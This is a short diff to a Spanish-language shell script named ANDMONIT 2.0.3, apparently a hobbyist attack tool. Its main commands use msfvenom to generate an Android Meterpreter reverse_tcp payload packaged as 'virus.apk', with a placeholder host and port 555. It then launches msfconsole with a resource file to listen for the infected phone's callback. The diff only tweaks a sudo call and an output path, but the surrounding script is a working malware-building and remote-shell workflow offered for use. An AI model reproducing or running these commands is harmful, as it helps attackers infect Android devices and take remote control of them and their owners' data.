@@ -1,7 +1,7 @@
 sudo clear
 figlet ANDMONIT 2.0.3
 echo INICIANDO SERVICIOS:
-sudo echo 	[!] INICIANDO ANDMONIT...
+echo 	[!] INICIANDO ANDMONIT...
 sleep 5
 clear
 figlet ANDMONIT 2.0.3
@@ -23,7 +23,7 @@ clear
 figlet ANDMONIT 2.0.3
 echo [!]CREANDO APK...
 cd /home/genplat/Escritorio/Virus
-sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > /home/genplat/Escritorio/Virus/virus.apk
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > virus.apk
 echo APK CREADA CON EXITO!
 echo [!]MONITOREANDO APK...
 sudo msfconsole -r android.rc
